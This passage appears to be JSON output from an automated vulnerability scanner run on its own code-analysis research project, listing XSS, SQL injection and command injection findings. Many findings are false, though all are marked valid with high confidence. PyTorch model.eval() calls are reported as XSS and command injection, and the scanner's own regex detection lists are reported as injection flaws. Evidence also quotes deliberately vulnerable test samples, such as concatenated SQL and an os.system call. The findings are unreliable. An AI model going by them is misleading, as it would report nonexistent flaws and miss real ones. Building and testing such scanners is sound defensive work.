        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: React dangerouslySetInnerHTML",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/vulnerability_verification_module.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "        dangerous_functions = {\n            'eval', 'exec', 'Function', 'setTimeout', 'setInterval',\n            'dangerouslySetInnerHTML', 'innerHTML'\n        }\n",
          "line_numbers": [
            341
          ],
          "file_path": "core/vulnerability_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-003",
        "title": "Cross-Site Scripting in vulnerability_verification_module.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: React dangerouslySetInnerHTML",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/vulnerability_verification_module.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "        input_sources = [r'req\\.body', r'req\\.query', r'params', r'input']\n        sinks = {\n            'XSS': [r'innerHTML', r'dangerouslySetInnerHTML', r'document\\.write'],\n            'CODE_INJECTION': [r'eval', r'Function', r'exec'],\n            'SQL_INJECTION': [r'query', r'execute', r'raw'],",
          "line_numbers": [
            361
          ],
          "file_path": "core/vulnerability_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u2713 User input flows to output",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-004",
        "title": "Cross-Site Scripting in vulnerability_verification_module.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: innerHTML assignment without sanitization",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/vulnerability_verification_module.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "    result = verifier.verify_vulnerability(\n        vuln_type='XSS',\n        code_snippet='element.innerHTML = userInput;',\n        file_path='test.js',\n        ml_confidence=0.85",
          "line_numbers": [
            476
          ],
          "file_path": "core/vulnerability_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u2713 User input flows to output",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "SQLi-001",
        "title": "SQL Injection in enhanced_fp_engine.py",
        "type": "SQL Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-89",
        "description": "SQL injection vulnerability detected due to sql query with string concatenation",
        "impact": "Attacker can execute arbitrary SQL queries, leading to data breach, data manipulation, or complete database compromise.",
        "affected_component": "core/enhanced_fp_engine.py",
        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation. Example: cursor.execute('SELECT * FROM users WHERE id = ?', [user_id])",
        "references": [
          "https://owasp.org/www-community/attacks/SQL_Injection",
          "https://cwe.mitre.org/data/definitions/89.html"
        ],
        "evidence": {
          "code_snippet": "    code2 = \"\"\"\n    def get_user(username):\n        query = \"SELECT * FROM users WHERE name = '\" + username + \"'\"\n        return db.execute(query)\n    \"\"\"",
          "line_numbers": [
            445
          ],
          "file_path": "core/enhanced_fp_engine.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Automated + Pattern Analysis",
        "steps_completed": [
          "\u2713 Checked for parameterized queries - NOT FOUND",
          "\u2713 Detected string concatenation in SQL query",
          "\u2713 User input flows into SQL query",
          "\u2713 Generated proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in enhanced_fp_engine.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/enhanced_fp_engine.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "            self.fp_model.load_state_dict(torch.load(model_path, map_location=device))\n\n        self.fp_model.eval()\n\n    def embed_code(self, code: str) -> torch.Tensor:",
          "line_numbers": [
            266
          ],
          "file_path": "core/enhanced_fp_engine.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u2713 User input flows to output",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in enhanced_fp_engine.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/enhanced_fp_engine.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "            self.fp_model.load_state_dict(torch.load(model_path, map_location=device))\n\n        self.fp_model.eval()\n\n    def embed_code(self, code: str) -> torch.Tensor:",
          "line_numbers": [
            266
          ],
          "file_path": "core/enhanced_fp_engine.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "SQLi-001",
        "title": "SQL Injection in neural_formal_integration.py",
        "type": "SQL Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-89",
        "description": "SQL injection vulnerability detected due to sql query with string concatenation",
        "impact": "Attacker can execute arbitrary SQL queries, leading to data breach, data manipulation, or complete database compromise.",
        "affected_component": "core/neural_formal_integration.py",
        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation. Example: cursor.execute('SELECT * FROM users WHERE id = ?', [user_id])",
        "references": [
          "https://owasp.org/www-community/attacks/SQL_Injection",
          "https://cwe.mitre.org/data/definitions/89.html"
        ],
        "evidence": {
          "code_snippet": "    code1 = \"\"\"\n    def get_user(username):\n        query = \"SELECT * FROM users WHERE name = '\" + username + \"'\"\n        cursor.execute(query)\n        return cursor.fetchone()",
          "line_numbers": [
            641
          ],
          "file_path": "core/neural_formal_integration.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Automated + Pattern Analysis",
        "steps_completed": [
          "\u2713 Checked for parameterized queries - NOT FOUND",
          "\u2713 Detected string concatenation in SQL query",
          "\u2713 User input flows into SQL query",
          "\u2713 Generated proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in neural_formal_integration.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/neural_formal_integration.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        import re\n        dangerous_patterns = [\n            (r'system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'system() with variable'),\n            (r'exec\\s*\\([^)]*\\w+[^)]*\\)', 0.90, 'exec() with variable'),\n            (r'os\\.system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'os.system() with variable'),",
          "line_numbers": [
            475
          ],
          "file_path": "core/neural_formal_integration.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-002",
        "title": "Command Injection in neural_formal_integration.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: exec() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/neural_formal_integration.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        dangerous_patterns = [\n            (r'system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'system() with variable'),\n            (r'exec\\s*\\([^)]*\\w+[^)]*\\)', 0.90, 'exec() with variable'),\n            (r'os\\.system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'os.system() with variable'),\n            (r'subprocess.*shell\\s*=\\s*True', 0.85, 'subprocess with shell=True'),",
          "line_numbers": [
            476
          ],
          "file_path": "core/neural_formal_integration.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-003",
        "title": "Command Injection in neural_formal_integration.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/neural_formal_integration.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "            (r'system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'system() with variable'),\n            (r'exec\\s*\\([^)]*\\w+[^)]*\\)', 0.90, 'exec() with variable'),\n            (r'os\\.system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'os.system() with variable'),\n            (r'subprocess.*shell\\s*=\\s*True', 0.85, 'subprocess with shell=True'),\n        ]",
          "line_numbers": [
            477
          ],
          "file_path": "core/neural_formal_integration.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in multitask_training_pipeline.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/multitask_training_pipeline.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "    def evaluate(self, val_loader: DataLoader) -> Dict:\n        \"\"\"Evaluate with VD-Score\"\"\"\n        self.model.eval()\n\n        all_predictions = {",
          "line_numbers": [
            461
          ],
          "file_path": "core/multitask_training_pipeline.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in multitask_training_pipeline.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/multitask_training_pipeline.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "    def evaluate(self, val_loader: DataLoader) -> Dict:\n        \"\"\"Evaluate with VD-Score\"\"\"\n        self.model.eval()\n\n        all_predictions = {",
          "line_numbers": [
            461
          ],
          "file_path": "core/multitask_training_pipeline.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in codebert_ensemble.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/codebert_ensemble.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "            predictions (0 or 1), probabilities (for class 1)\n        \"\"\"\n        self.model.eval()\n\n        all_preds = []",
          "line_numbers": [
            231
          ],
          "file_path": "core/codebert_ensemble.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-002",
        "title": "Cross-Site Scripting in codebert_ensemble.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/codebert_ensemble.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "        from torch_geometric.loader import DataLoader\n\n        self.gnn_model.eval()\n        loader = DataLoader(graph_data_list, batch_size=batch_size, shuffle=False)\n",
          "line_numbers": [
            316
          ],
          "file_path": "core/codebert_ensemble.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in codebert_ensemble.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/codebert_ensemble.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "            predictions (0 or 1), probabilities (for class 1)\n        \"\"\"\n        self.model.eval()\n\n        all_preds = []",
          "line_numbers": [
            231
          ],
          "file_path": "core/codebert_ensemble.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-002",
        "title": "Command Injection in codebert_ensemble.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/codebert_ensemble.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        from torch_geometric.loader import DataLoader\n\n        self.gnn_model.eval()\n        loader = DataLoader(graph_data_list, batch_size=batch_size, shuffle=False)\n",
          "line_numbers": [
            316
          ],
          "file_path": "core/codebert_ensemble.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in reproduce_table1.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: os.system() with string concatenation",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "experiments/reproduce_table1.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        '''import os\ndef run(cmd):\n    os.system(\"echo \" + cmd)''',\n\n        # Path Traversal",
          "line_numbers": [
            75
          ],
          "file_path": "experiments/reproduce_table1.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-002",
        "title": "Command Injection in reproduce_table1.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "experiments/reproduce_table1.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        '''import os\ndef run(cmd):\n    os.system(\"echo \" + cmd)''',\n\n        # Path Traversal",
          "line_numbers": [
            75
          ],
          "file_path": "experiments/reproduce_table1.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    }
  ]
}